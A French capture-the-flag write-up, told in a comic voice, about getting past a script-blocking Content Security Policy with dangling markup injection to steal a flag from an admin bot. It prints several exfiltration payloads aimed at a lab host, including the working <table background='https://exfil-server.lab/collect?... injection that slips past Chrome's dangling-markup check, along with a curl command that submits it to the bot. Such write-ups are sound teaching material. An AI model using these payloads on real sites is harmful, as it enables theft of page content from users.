---
layout: default
---

# CSP Bypass : comment j'ai dangle le markup avec une table HTML comme un grand malade

## Le dikkenek de la cybersec

Bon. Je pose le decor. Il est minuit, j'ai un ecran, un terminal, et la confiance d'un mec qui a jamais rate quoi que ce soit de sa vie. Ce soir, je m'attaque a un challenge web client, categorie difficile, et l'indice c'est : "Attention, les navigateurs ont leur propre logique." Je lis ca et je me dis : pas de souci, de la logique, j'en ai pour douze. Je suis Stef. La logique, c'est mon metier. Ma main a couper que ca va etre plie en vingt minutes.

Spoiler : ca n'a pas ete plie en vingt minutes.

## Le terrain de jeu

Le site s'appelle "Quackquack CSP". Un formulaire, un champ "nom", et la page qui reflete le nom dans le HTML brut, sans aucun filtrage. Du XSS reflected classique, sauf que... non. La Content Security Policy du serveur est la suivante :

```
script-src 'none'; style-src 'self'; connect-src 'none'; font-src 'none';
frame-src 'none'; object-src 'none'; media-src 'none'; worker-src 'none';
block-all-mixed-content
```

`script-src 'none'`. Aucun JavaScript. Niet. Nada. On peut injecter toutes les balises `<script>` qu'on veut, le navigateur les bloque froidement. Pas de `default-src` non plus, et surtout : pas de `img-src`. Ca veut dire que les images, elles, peuvent partir vers n'importe quel domaine externe. Ca, c'est mon point d'entree.

Un bot admin tourne sur le site. HeadlessChrome. On lui soumet une URL via `/report`, il la visite, et dans la page qu'il charge, le flag est affiche en clair. Le but : exfiltrer ce flag sans aucun script. Juste du HTML.

## Dangling markup : la theorie

Le principe est elegant. On injecte une balise avec un attribut URL (genre `src` ou `href`) et on laisse la quote ouvrante... ouverte. Le navigateur, ne trouvant pas de quote fermante, "avale" tout le HTML qui suit -- y compris le flag -- comme s'il faisait partie de l'URL. Le contenu capture est envoye en requete vers le serveur attaquant. Exfiltration sans une seule ligne de JavaScript.

En theorie, c'est beau. En theorie.

## Premiere tentative : `<img src>` (la classique)

Je le sens. Je le sens bien. Je monte le payload :

```html
<img src='https://exfil-server.lab/collect?
```

La quote simple reste ouverte. Tout le HTML apres l'injection, flag compris, va se retrouver dans l'URL de l'image. Le serveur d'exfiltration recoit la requete, je lis le flag dans les logs, on rentre a la maison.

Je soumets. Je patiente. Cinq minutes. Dix minutes. Rien sur le webhook. Quinze minutes. Toujours rien. Je me dis que le serveur est mort. Je me dis que j'ai fait une typo. Je soumets un simple `<img src=https://exfil-server.lab/test>` sans dangling, juste pour verifier que le bot existe bien.

Vingt minutes plus tard : le hit arrive sur le webhook. Le bot est vivant. Les images externes passent. Mais le dangling, lui ? Rien du tout.

## Deuxieme tentative : `<meta http-equiv="refresh">`

C'etait pour tester, hein. Je savais que ca marcherait pas forcement. Mais bon, on couvre les bases :

```html
<meta http-equiv="refresh" content='0;url=https://exfil-server.lab/collect?
```

J'attends encore. Le bot met quinze a vingt minutes a traiter chaque soumission. Et apres cinq tentatives : "Too many attempts, please try again after 10 minutes." Rate limit. Je suis bloque dix minutes pour avoir eu l'audace de tester des payloads. C'est excessivement enervant.

Resultat : zero hit. Bloque aussi.

## Troisieme tentative : `<link rel="icon">`

La, je me dis : les favicons, Chrome les charge sans broncher, non ?

```html
<link rel="icon" href='https://exfil-server.lab/collect?
```

Attente. Rien. Bloque.

A ce stade, je commence a comprendre que le probleme n'est pas le serveur, pas le bot, pas le webhook. Le probleme, c'est Chrome. Chrome detecte les URL contenant des retours a la ligne (`\n`) et des chevrons (`<`) dans les attributs `src` et `href`, et il bloque purement et simplement la requete. C'est une protection anti-dangling markup integree au navigateur.

Donc recap : j'ai une injection HTML, j'ai des images qui passent la CSP, j'ai un bot qui visite mes pages, mais Chrome me bloque le dangling sur toutes les balises classiques. Chrome me cherche. Chrome me trouve. Chrome me met des batons dans les roues comme si c'etait personnel.

## Le declic : les attributs deprecies

L'indice du challenge me revient : "les navigateurs ont leur propre logique." Chaque navigateur gere le dangling markup a sa facon. Et Chrome, justement, a une logique bien a lui sur les attributs deprecies.

Je tombe sur `background`, l'attribut HTML deprecie qu'on collait aux `<table>` en 1998 pour mettre des images de fond. Ca fait vingt ans que plus personne ne l'utilise. Et c'est exactement pour ca que Chrome ne le surveille pas.

La ou Chrome bloque les `src` et `href` qui contiennent des newlines et des chevrons, il ne fait pas la meme verification sur `background`. Au lieu de bloquer la requete, il strip les newlines et envoie quand meme. Il nettoie l'URL au lieu de la refuser.

C'etait sous mon nez depuis le debut. Comme dirait l'autre, on va peut-etre pas mettre la barre trop haut, mais la, elle etait par terre et je marchais a cote.

## Le payload final

```html
<table background='https://exfil-server.lab/collect?
```

La quote simple reste ouverte. Chrome parse tout le HTML qui suit comme faisant partie de l'URL du `background`. Dans la page du challenge, quelque part apres le flag, il y a un caractere `'` (dans l'emoticone `:'(`) qui ferme la quote. Tout le contenu entre l'injection et cette quote -- flag inclus -- est capture dans l'URL.

Chrome strip les newlines, concatene le tout, et envoie la requete vers mon serveur. Le flag arrive dans les parametres de l'URL.

Soumission au bot :

```bash
curl -X POST 'https://quackquack-csp.lab/report' \
  -d "url=https://quackquack-csp.lab/page?user=%3Ctable%20background%3D'https://exfil-server.lab/collect?"
```

J'attends. Cette fois, je sais que ca va prendre un quart d'heure. Je suis zen. Je suis serein.

Et la, le hit tombe sur le webhook. Dans l'URL de la requete, au milieu du HTML aspire : le flag.

```
[FLAG REDACTED]
```

Le flag lui-meme explique la technique : Chrome ne bloque pas, il supprime les newlines -- "NO NEW LINE". Il a sa propre logique, comme disait l'indice. Et sa logique sur les attributs deprecies, c'est de faire le menage au lieu de tout couper.

Quand je lis ce flag, je me cale dans ma chaise. J'ai les yeux de Labrador. C'est le genre de moment ou tu sais que t'as gere, meme si t'as mis trois heures au lieu de vingt minutes, meme si t'as crame ton rate limit comme un debutant, meme si t'as doute de tout. Je le savais, au fond. Depuis le debut, je le savais.

---

## Ce qu'on retient

| Concept | Detail |
|---|---|
| **CSP sans `default-src` ni `img-src`** | Les images peuvent etre chargees depuis n'importe quelle origine -- vecteur d'exfiltration |
| **Dangling markup** | Injection d'une balise avec une quote ouverte pour capturer le HTML suivant dans l'URL |
| **Protection Chrome anti-dangling** | Chrome bloque les URL avec newlines + chevrons dans `src`, `href`, `content` des balises classiques |
| **Attributs HTML deprecies** | `background` sur `<table>` echappe a la detection : Chrome strip les newlines au lieu de bloquer |
| **Comportement specifique navigateur** | Chaque navigateur a ses propres regles de filtrage -- tester les cas limites est essentiel |
| **Exfiltration sans JS** | Le dangling markup permet l'exfiltration de contenu HTML sans aucun JavaScript |

## Outils utilises

- **curl** -- soumission des URL au bot et tests manuels sur le formulaire
- **Webhook.site** -- serveur d'exfiltration pour recevoir les requetes du bot
- **Chrome DevTools** -- analyse de la CSP et du comportement du navigateur
- **Documentation MDN / Chromium source** -- recherche sur le filtrage des attributs deprecies

## References techniques

- [CSP Specification (W3C)](https://www.w3.org/TR/CSP3/)
- [Dangling markup injection - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
- [Chromium dangling markup mitigation](https://chromestatus.com/feature/5735596811091968)
- [HTML obsolete attributes - MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table#deprecated_attributes)
